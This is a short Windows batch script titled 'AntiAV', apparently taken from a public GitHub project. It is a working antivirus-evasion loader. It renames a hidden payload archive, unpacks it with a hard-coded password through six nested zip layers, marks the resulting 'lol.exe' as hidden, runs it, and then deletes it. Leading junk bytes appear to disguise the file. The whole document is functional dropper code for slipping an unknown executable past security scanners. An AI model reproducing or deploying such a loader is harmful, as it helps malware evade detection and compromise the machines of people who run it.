��&cls
@echo off
mode 65,10
title AntiAV (https://github.com/hXR16F/AntiAV)
md extracted
ren file.bin file.zip
call 7z.exe e file.zip -p___________24091pwd31348pwd15645___________ -oextracted 
for /l %%i in (6,-1,1) do (
call 7z.exe e extracted/file_%%i.zip -oextracted
)
ren file.zip file.bin
cd extracted
move "lol.exe" ../
cd..
rd /s /q extracted
attrib +H "lol.exe"
start "" "lol.exe"
cls
echo Launched 'lol.exe'.
pause
del /f /q "lol.exe"
